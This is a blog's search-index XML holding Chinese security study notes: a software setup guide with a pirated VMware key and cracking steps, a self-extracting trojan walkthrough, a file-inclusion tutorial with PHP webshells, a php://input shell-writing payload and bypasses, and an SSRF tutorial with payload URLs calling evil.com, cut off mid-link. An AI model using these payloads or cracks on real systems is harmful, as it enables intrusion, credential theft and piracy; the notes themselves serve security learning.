<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>配置教程</title>
      <link href="/2024/10/03/%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
      <url>/2024/10/03/%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><p>1<a href="https://www.vmware.com/products/desktop-hypervisor.html">vmware17</a><br>2<a href="https://public.xp.cn/upgrades/phpStudy_64.zip">phpstudy</a><br>3<a href="https://download.oracle.com/java/22/latest/jdk-22_windows-x64_bin.msi">java22</a><br>4<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83/python-3.9.2rc1-amd64.exe">python3.9</a><br>5<a href="https://download-cdn.jetbrains.com/idea/ideaIU-2024.1.4.exe">IDEA</a><br>6<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Navicat%20Premium%2012.zip">Navicat</a><br>7<a href="https://vscode.download.prss.microsoft.com/dbazure/download/stable/ea1445cc7016315d0f5728f8e8b12a45dc0a7286/VSCodeUserSetup-x64-1.91.0.exe">vscode</a><br>8<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Uninstall%20Tool.zip">Uninstall Tool(系统软件卸载工具)</a>不是必须的<br>9<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Bandizip%20v7.23.zip">bandzip(解压软件)</a>不是必须的<br>10<a href="https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe">everything(</a>全局文件搜索软件)不是必须的  </p><span id="more"></span><h1 id="软件安装方法"><a href="#软件安装方法" class="headerlink" title="软件安装方法"></a>软件安装方法</h1><p><a href="http://sunwu.world/2023/02/14/vmware17%e5%ae%89%e8%a3%85%e5%8f%8awin11%e5%ae%89%e8%a3%85/">vmware</a></p><p>许可证: <code>JU090-6039P-08409-8J0QH-2YR7F</code>  </p><p>phpstudy<br>建议安装路径不要修改，默认安装在D盘  </p><p>java22<br>记得选择安装路径，要求安装路径记得  </p><h2 id="python3-9"><a href="#python3-9" class="headerlink" title="python3.9"></a>python3.9</h2><ol><li>加入<code>path</code>，自定义安装<br>![[Pasted image 20240708154242.png]]</li><li>全部勾选<br>![[Pasted image 20240708154324.png]]</li><li>前四个全勾，并选择安装位置<br>![[Pasted image 20240708154436.png]]</li><li>注意自定义安装位置</li><li>打开系统环境变量<br>![[Pasted image 20240708154643.png]]<br>![[Pasted image 20240708154656.png]]</li><li>将python加入系统环境变量(复制粘贴)<br>![[Pasted image 20240708154742.png]]</li><li>确定，确定，重启电脑</li></ol><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><ol><li>选择路径安装idea，全勾<br><img src="/../img/Pasted%20image%2020240710202427.png"></li><li>安装完成,关闭idea，以管理员身份运行激活包<br><img src="/../img/Pasted%20image%2020240710202439.png"></li><li>激活完毕，重启电脑  </li><li>输入激活码<br><img src="/../img/Pasted%20image%2020240710202451.png"></li></ol><h2 id="bandzip-解压软件"><a href="#bandzip-解压软件" class="headerlink" title="bandzip(解压软件)"></a>bandzip(解压软件)</h2><ol><li>正常安装，记得选择安装路径<br><img src="/../img/Pasted%20image%2020240710202501.png"></li><li>破解<br><img src="/../img/Pasted%20image%2020240710202521.png"></li><li>去广告，选项-设置<br><img src="/../img/Pasted%20image%2020240710202539.png"></li></ol><h1 id="vscode插件"><a href="#vscode插件" class="headerlink" title="vscode插件"></a>vscode插件</h1><ol><li><p>codeium<br><img src="/../img/Pasted%20image%2020240710202550.png"></p></li><li><p>chinese<br><img src="/../img/Pasted%20image%2020240710202558.png"></p></li><li><p>code runner<br><img src="/../img/Pasted%20image%2020240710202606.png"></p></li><li><p>ctrl+滚轮(调节字体大小)</p></li></ol><p>注：  </p><ol><li>安装路径不要有中文  </li><li>最好不装在C盘  </li><li>安装路径不要有空格和符号(_除外)</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自解压木马</title>
      <link href="/2024/10/03/%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%9C%A8%E9%A9%AC/"/>
      <url>/2024/10/03/%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="1-压缩包文件夹准备，放入木马（触发程序）"><a href="#1-压缩包文件夹准备，放入木马（触发程序）" class="headerlink" title="1. 压缩包文件夹准备，放入木马（触发程序）"></a>1. 压缩包文件夹准备，放入木马（触发程序）</h2><p><img src="/../img/Pasted%20image%2020240711111126.png"></p><span id="more"></span><h2 id="2-使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是"><a href="#2-使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是" class="headerlink" title="2. 使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是\)"></a>2. 使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是<code>\</code>)</h2><p><img src="/../img/Pasted%20image%2020240711112644.png"><br><img src="/../img/Pasted%20image%2020240711111305.png"></p><h2 id="3-模式选择全隐藏"><a href="#3-模式选择全隐藏" class="headerlink" title="3. 模式选择全隐藏"></a>3. 模式选择全隐藏</h2><p><img src="/../img/Pasted%20image%2020240711111350.png"><br><img src="/../img/Pasted%20image%2020240711111402.png"></p><h2 id="4-生成自解压木马测试-exe"><a href="#4-生成自解压木马测试-exe" class="headerlink" title="4.生成自解压木马测试.exe"></a>4.生成自解压木马测试.exe</h2><p><img src="/../img/Pasted%20image%2020240711111650.png"></p><h2 id="5-启动自解压木马，静默解压到自解压位置并自行触发安装程序"><a href="#5-启动自解压木马，静默解压到自解压位置并自行触发安装程序" class="headerlink" title="5. 启动自解压木马，静默解压到自解压位置并自行触发安装程序"></a>5. 启动自解压木马，静默解压到自解压位置并自行触发安装程序</h2><p><img src="/../img/Pasted%20image%2020240711112051.png"><br><img src="/../img/Pasted%20image%2020240711112015.png"></p><h2 id="6-后记"><a href="#6-后记" class="headerlink" title="6. 后记"></a>6. 后记</h2><p>嗯。。。这算是配合那个啥子flash弹窗触发的一个自捆绑木马，还挺离谱的。。。，对以前的全家桶下载包有了些许新奇的认知</p><blockquote><p>[!NOTE] Title<br>Contents</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2024/10/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/10/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于基本十大漏洞之一文件包含的一些学习笔记</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h1><p>简单定义：用户输入的数据未经过严格校验并过滤，就拼接到<strong>文件包含函数</strong>中并执行。</p><p>详细定义：File inclusion(文件包含漏洞)是一种依赖于脚本运行而影响应用程序的漏洞，因为许多脚本语言支持使用文件包含（将另一个文件代码加入当前文件中），这种功能允许开发者把可使用的代码插入单个文件中，然后包含文件当中的代码会被当前脚本解释执行，由于开发者使用了可变的文件包含路径，且没有对变量参数做过滤和处理，导致攻击者可以控制变量，构造恶意文件路径，导致文件包含漏洞。</p><blockquote><p>[!NOTE] php常见的文件包含函数<br><code>require()</code>：只要程序一运行就包含文件，找不到被包含的文件时会产生报错并终止脚本的运行<br><code>include()</code>：当程序执行到include()函数时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br><code>include_once()</code>：与include()类似，但文件中代码已被包含则不会再次包含<br><code>require_once()</code>：与require()类似，但文件中代码已被包含则不会再次包含</p></blockquote><h1 id="主要分类"><a href="#主要分类" class="headerlink" title="主要分类"></a>主要分类</h1><p>主要分为本地文件包含和远程文件包含，区别主要也就是被包含文件的位置，即本地和远程</p><h3 id="本地文件包含：包含当前服务器本地文件的漏洞"><a href="#本地文件包含：包含当前服务器本地文件的漏洞" class="headerlink" title="本地文件包含：包含当前服务器本地文件的漏洞"></a>本地文件包含：包含当前服务器本地文件的漏洞</h3><p>代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>$_GET[&#39;filename&#39;]</code> 获取用户通过 URL 传递的 <code>filename</code> 参数值，将其赋值给 <code>$file</code> 变量。例如，假设 URL 是 <code>example.com/script.php?filename=test.php</code>，那么 <code>$file</code> 就会等于 <code>test.php</code>。</li><li><code>include</code> 是 PHP 中用于包含并执行另一个 PHP 文件的语句。该语句会将 <code>$file</code> 变量的值对应的文件内容包含并执行。如果 <code>$file</code> 的值是 <code>test.php</code>，那么 <code>test.php</code> 文件的内容会被载入并执行。</li></ul><h4 id="示例：使用phpstudy搭建网页，以文件包含的代码创建一个1-php文件"><a href="#示例：使用phpstudy搭建网页，以文件包含的代码创建一个1-php文件" class="headerlink" title="示例：使用phpstudy搭建网页，以文件包含的代码创建一个1.php文件"></a>示例：使用phpstudy搭建网页，以文件包含的代码创建一个1.php文件</h4><ol><li><p>直接访问1.php文件，由于没有内容所以直接报错。<br><img src="https://i.imgur.com/1HejgDO.gif" alt="动画.gif"></p></li><li><p>传参一个指定的文件路径，读取了指定文件内容<br><img src="https://i.imgur.com/1d0qHDV.gif" alt="动画26.gif"></p></li><li><p>执行php代码</p></li></ol><p>创建一个一句话木马文件且类型为<code>.txt</code>,名为muma.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接访问muma.txt<br><img src="https://i.imgur.com/CZvhyWX.gif"><br>传入参数a&#x3D;phpinfo(),成功执行（注意此处文件包含传参不要用？,而是使用&amp;）<br><img src="https://i.imgur.com/AWQd6wx.gif" alt="动画26.gif"></p><p>结论：本地文件包含能使包含的任意文件都能执行</p><h3 id="远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过"><a href="#远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过" class="headerlink" title="远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过"></a>远程文件包含：包含其他服务器上的文件，不仅限于php，但可能对方会做过滤或者验证，所以还需要考虑绕过</h3><blockquote><p>[!warning] 必要前置<br>配置文件php.ini中的allow_url_fopen,allow_url_include的值为ON<br>allow_url_include    是否允许引用URL文件<br>allow_url_fopen      是否允许打开URL文件<br>phpstudy配置文件的参考路径：phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php5.59.nts&#x2F;php.ini</p></blockquote><h4 id="示例：本地配置phpstudy的php-ini文件，远程主机创建木马文件"><a href="#示例：本地配置phpstudy的php-ini文件，远程主机创建木马文件" class="headerlink" title="示例：本地配置phpstudy的php.ini文件，远程主机创建木马文件"></a>示例：本地配置phpstudy的php.ini文件，远程主机创建木马文件</h4><ol><li>php.ini配置完毕，尝试远程文件包含</li></ol><p><img src="https://i.imgur.com/Yf6xlT8.gif" alt="动画26.gif"></p><ol start="2"><li>远程连接服务器创建木马文件muma.php</li></ol><p><img src="https://i.imgur.com/sfPG4Wc.gif" alt="动画26.gif"></p><ol start="3"><li>远程文件包含代码执行</li></ol><p><img src="https://i.imgur.com/X2dUrG3.gif" alt="动画26.gif"><br>结论：本地没有木马，自己在自己的服务器上写马，然后让目标包含你的服务器上的马，从而达成获取权限</p><h1 id="主要危害"><a href="#主要危害" class="headerlink" title="主要危害"></a>主要危害</h1><h2 id="获取相关配置信息"><a href="#获取相关配置信息" class="headerlink" title="获取相关配置信息"></a>获取相关配置信息</h2><p>通过查看敏感文件获取配置信息，也可以通过访问相关日志获取敏感信息</p><blockquote><p>[!NOTE] 敏感路径<br>windows系统：</p><p>　　c:\boot.ini  &#x2F;&#x2F;  查看系统版本</p><p>　　c:\windows\system32\inetsrc\MetaBase.xml   &#x2F;&#x2F;IIS配置文件</p><p>　　c:\windows\repair\sam   &#x2F;&#x2F;存储windows系统初次安装的密码</p><p>　　c:\programFiles\mysql\my.ini  &#x2F;&#x2F;MYSQL root密码</p><p>　　c:\windows\php.ini &#x2F;&#x2F; php 配置信息</p><p>Linux&#x2F;Unix系统</p><p>    &#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</p><p>    &#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</p><p>    &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</p><p>   &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</p><p>    &#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</p><p>    &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</p><p>    &#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</p></blockquote><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>参见前文的两个示例</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><blockquote><p>[!NOTE] 命令执行示例<br>此处以本地文件包含为示例：</p><ul><li>修改前面的一句话木马代码为系统执行的代码<br><img src="https://i.imgur.com/BYvzI4C.gif" alt="动画26.gif"></li><li>执行系统命令<br><img src="https://i.imgur.com/zqxTO42.gif" alt="动画26.gif"></li></ul></blockquote><h3 id="可利用途径："><a href="#可利用途径：" class="headerlink" title="可利用途径："></a>可利用途径：</h3><p>　　·上传图片：图片包含getshell</p><p>　　·读文件：读取php文件</p><p>　　·包含日志文件getshell</p><p>　　·包含&#x2F;proc&#x2F;self&#x2F;environ&#x2F;文件getshell</p><p>　　·有phpinfo可包含临时文件</p><p>　　·包含data:&#x2F;&#x2F;或php:&#x2F;&#x2F;inout等伪协议（需要allow_url_include&#x3D;On）</p><h2 id="常见的使用方式"><a href="#常见的使用方式" class="headerlink" title="常见的使用方式"></a>常见的使用方式</h2><p>通过抓包修改UA从而实现日志写马<br>根据不同中间件来判断不同的日志储存位置，例如access.log或者error.log等，所以可以尝试写入一些奇怪的数据，例如<code>&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code>,访问出错后就会写入日志文件，在使用本地包含漏洞包含日志文件，从而得到webshell</p><p>注：一般在referer或者ua中写入，尽量使用抓包改包写入，不然很可能会被url编码，导致木马失效</p><p><img src="https://i.imgur.com/F2WZVN8.gif" alt="动画26.gif"></p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>大致详情参见：<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a><br>这里主要参照：<a href="https://www.php.net/manual/zh/wrappers.php.php">PHP: php:&#x2F;&#x2F; - Manual</a></p><p>php带有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exists()、filesize()等文件系统函数所提供的功能类似；可以结合文件包含进行漏洞利用</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>条件：allow_url_fopen和allow_url_include同时开启 （PHP&lt;5.3.0）</p><p>步骤：</p><p>1.修改url部分加入<code>?file=php://input</code>发送请求，然后抓包</p><p>2.加入参数<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#39;);?&gt;</code>,</p><p>用写入模式 (<code>&#39;w&#39;</code>)打开名为 <code>shell.php</code> 的文件(没有则创建)，并将<code>&#39;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#39;</code>写入。以此达成创建一句话木马文件的目的</p><p>最后结果是在当前目录下生成一个一句话木马文件shell.php</p><p><img src="https://i.imgur.com/Wj2ZVIQ.gif" alt="动画26.gif"></p><p>木马效果，可以正常传参并执行php</p><p><img src="https://i.imgur.com/BLAjvhe.gif" alt="动画26.gif"></p><p>php:&#x2F;&#x2F;input接受GET，POST，PUT三种传参，但主要还是使用读取</p><p><img src="https://i.imgur.com/pd5GV0Q.gif" alt="动画26.gif"></p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>条件:只是读取，需要开启allow_url_fopen，不需开启allow_url_include</p><p>php:&#x2F;&#x2F;filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器的名称，以管道符（<code>|</code>）分割。</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>该参数可选。可设定一个或多个过滤器名称，以管道符(<code>|</code>)分隔</td></tr><tr><td>&lt;;两个链的筛选列表&gt;</td><td>任何没有以<code>read=</code>或<code>write=</code>为前缀的筛选器列表会视情况应用于读或写链、</td></tr></tbody></table><p>编码读取代码示例：</p><p><code>php://filter/read=covert.base64-encode/resource=</code></p><p><img src="https://i.imgur.com/hA9ZTUc.gif" alt="动画26.gif"></p><p>常用的使用，在无法明文读取的情况下，跳过效验以base64读取文件获取文件内容</p><p><img src="https://i.imgur.com/yvsqwLH.gif" alt="动画26.gif"></p><p>伪协议参考：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#要实现远程文件包含需要allow_url_fopen和allow_url_include都开启</span></span><br><span class="line"><span class="comment">#读文件(需要开启 allow_url_fopen)</span></span><br><span class="line">?filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xxx.php </span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#post传值（需开启 allow_url_include）</span></span><br><span class="line">?file=php:<span class="comment">//input </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码执行(php&gt;=5.2.0)</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 </span></span><br><span class="line">data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#file读文件</span></span><br><span class="line">?abc=file:<span class="comment">///etc/passwd</span></span><br><span class="line"><span class="comment">#phar（&gt;=5.3.0）</span></span><br><span class="line">?file=phar:<span class="comment">//压缩包/内部文件 phar://xxx.png（压缩包）/shell.php （内部文件）</span></span><br><span class="line"><span class="comment">#zip（PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才</span></span><br><span class="line">可以 <span class="comment">#在浏览器中要编码为%23）</span></span><br><span class="line">?file=zip:<span class="comment">//[压缩文件绝对路径]%23[压缩文件内的子文件名] </span></span><br><span class="line">zip:<span class="comment">//xxx.png#shell.php     </span></span><br></pre></td></tr></table></figure><h4 id="常用的绕过"><a href="#常用的绕过" class="headerlink" title="常用的绕过"></a>常用的绕过</h4><p>绕过方法1：%00 截断</p><p>　　条件：magic_quotes_gpc &#x3D; Off PHP 版本&lt;5.3.4</p><p>　　测试：？filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00</p><p>绕过方法2：路径长度截断</p><p>　　条件：windows下目录路径最大长度为256字节，超出部分将丢弃；</p><p> 　　　　  Linux下目录最大长度为4096字节，超出长度将丢弃</p><p>　　测试：?filename&#x3D;text.txt.&#x2F;.&#x2F;.&#x2F;.&#x2F;.  或?filename&#x3D;test.txt…..</p><p><strong>限制远程包含绕过</strong></p><p>　测试代码：<?php include($_GET['filename'].".html");?>  多添加了html后缀，到最后远程包含的文件　一会多一个HTML后缀</p><p><strong>问号绕过</strong></p><p>　　测试：？filename&#x3D;<a href="http://192.168.91.133/FI/php.txt">http://192.168.91.133/FI/php.txt</a>?</p><hr><p>　　测试：?filenamr&#x3D;<a href="http://192.168.91.133/FI/php.txt%23">http://192.168.91.133/FI/php.txt%23</a></p><p><strong>空格绕过</strong></p><p>　　测试：?filename&#x3D;<a href="http://192.168.91.133/FI/php.txt%20">http://192.168.91.133/FI/php.txt%20</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2024/10/03/SSRF/"/>
      <url>/2024/10/03/SSRF/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于基本十大漏洞之一SSRF的一些学习笔记,主要涵盖SSRF盲打，协议的使用，SSRF+redis的内容</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p>参考网址：<a href="https://xz.aliyun.com/t/12227?time__1311=GqGxRDcGD=0=0QD/YriQ=Tqmq0I3xE8270bD#toc-10">SRC中的SSRF漏洞挖掘笔记1.0 - 先知社区 (aliyun.com)</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><strong>服务端请求伪造</strong>（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。</p><p>SSRF攻击通常针对外部网络无法直接访问的内部网络。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><img src="https://i.imgur.com/yd0yD7S.png"></p><ul><li>第一个请求Requeset1 通常是HTTP协议</li><li>第二个请求Requeset2 由应用程序本身功能决定 理论上可以有各种protocol&#x2F;scheme，攻击者可以进行构造进行利用,一般常用的协议有<code>file://</code>，<code>dict://</code>，<code>gopher://</code>，<code>http://</code>,<code>https://</code> <ul><li><code>file://</code> <code>http://example.com/ssrf.php?url=file:///etc/passwd</code></li><li>SSH <code>scp://</code> <code>sftp://</code></li><li><code>dict://</code> <code>http://example.com/ssrf.php?dict://evil.com:1337/</code></li><li><code>ldap://</code> LDAP(Lightweight Directory Access Protocol,轻量级目录访问协议)<ul><li><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</code></li><li><code>http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</code></li><li><code>http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</code></li></ul></li><li><code>gopher://</code><ul><li>重要作用:几乎可与任意<strong>TCP</strong> service交互<ul><li>(1)指定<code>ip</code> <code>port</code> <code>bytes</code></li><li>(2)您可以利用 SSRF 与任何 TCP 服务进行通信。（但您需要首先知道如何与该服务通信。）</li></ul></li><li>利用过程 <code>http://example.com/ssrf.php?url=http://evil.com/gopher.php</code> 重定向到 <code>gopher://yourlink.tld</code>. <a href="https://github.com/1135/notes/blob/master/web_vul_SSRF.md#ssrf%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B---gopher%E5%8D%8F%E8%AE%AE%E7%BB%93%E5%90%88%E8%B7%B3%E8%BD%AC">详细过程</a></li></ul></li><li><code>tftp://</code> TFTP（Trivial File Transfer Protocol,简单文件传输协议) works over UDP<ul><li>重要作用:几乎可构造并发送任意的<strong>UDP</strong> packets</li><li>利用过程</li></ul></li></ul></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li><p>攻击者角度 按漏洞利用效果分类</p><ul><li>Basic SSRF - <strong>可回显</strong><ul><li>描述 : 攻击者可见【3】resp Body, 它通常与【4】resp Body完全相同<ul><li>to内网 - 攻击者可利用”SSRFserver”访问内网主机 (如同一内网的<code>oa.intranet.apple-inc.com</code>) 并在”SSRFserver”域下看到内网的<code>oa.intranet.apple-inc.com</code>的响应内容(如 oa登录页面)</li><li>to公网 - 攻击者可利用”SSRFserver”访问公网主机 (如攻击者的<code>evil.com</code>) 并在”SSRFserver”域下看到<code>evil.com</code>的响应内容(如 XSSpayload)</li></ul></li></ul></li><li>Blind SSRF - <strong>不可回显</strong><ul><li>描述 : 攻击者看不到【3】resp Body. 攻击者只能用<strong>间接</strong>方式 观察 判断<ul><li>HTTP response status - HTTP响应的状态码(200 500)</li><li>HTTP response time - 时间间隔的长短(得到HTTP响应时间点-发起HTTP请求的时间点)</li></ul></li><li>如果执行的 SSRF 攻击是没有输出的 盲SSRF 类型，你还需要使用外部 HTTP 日志记录工具来监视http请求消息，例如 <code>requestbin.com</code>、你自己的 HTTP 服务器或 BurpSuite 的 <code>Collaborator</code> 客户端。</li></ul></li></ul></li></ul><p>主要分为常规SSRF(有回显)与盲SSRF(blind盲)</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol><li><p>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</p></li><li><p>攻击运行在内网或本地的应用程序（比如溢出）</p></li><li><p>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</p></li><li><p>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</p></li><li><p>利用 <code>file</code> 协议读取本地文件等</p></li><li><p>获取到身份验证令牌&#x2F;凭证</p></li></ol><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>一些应用程序会阻止包含诸如 <code>localhost</code> 或 <code>127.0.0.1</code> 之类的主机名，或包含敏感 URL 的输入。在这种情况下，您可以使用以下技术绕过过滤器：</p><ol><li><p><strong>使用 <code>localhost</code> 的替代 IP 表示形式</strong>，</p><ul><li>IP地址的不同形式 - 进制转换(学名为<strong>回环地址绕过</strong>)<ul><li>十进制形式 <code>127.0.0.1 &lt;-&gt; 2130706433</code> 计算方法<code>(127)*256^3+(0)*256^2+(0)*256^1+(1)*256^0=2130706433</code> <code>(21)*256^1+(200)=5576</code> 如bing的外网IP转换为十进制形式 <code>13.107.21.200 &lt;-&gt; 13.107.5576 &lt;-&gt; 13.7017928 &lt;-&gt; 225121736</code></li><li>十六进制形式 <code>13.107.21.200 &lt;-&gt; 0xD6B15C8</code></li><li>IP变形例子: <code>127.0.0.1</code> 八进制Octal<code>017700000001</code> 十进制Dec<code>2130706433</code> 十六进制Hex<code>0x7F000001</code></li><li>混合各形式 如八进制.十进制 <code>13.107.21.200 &lt;-&gt; 015.7017928</code></li></ul></li></ul></li><li><p>**注册您自己的域名并将其解析到 <code>localhost</code>**。您可以使用 <code>spoofed.burpcollaborator.net</code> 来实现此目的。</p><ul><li>因为 <a href="http://localhost/">http://localhost/</a> 和 <a href="http://127.0.0.1/">http://127.0.0.1</a> 没有 http 形式，但是可以买一个域名，解析到 127.0.0.1。如果不想折腾，可以用现成的（都是大厂域名）：<br>  <a href="http://safe.taobao.com/">http://safe.taobao.com/</a><br>  <a 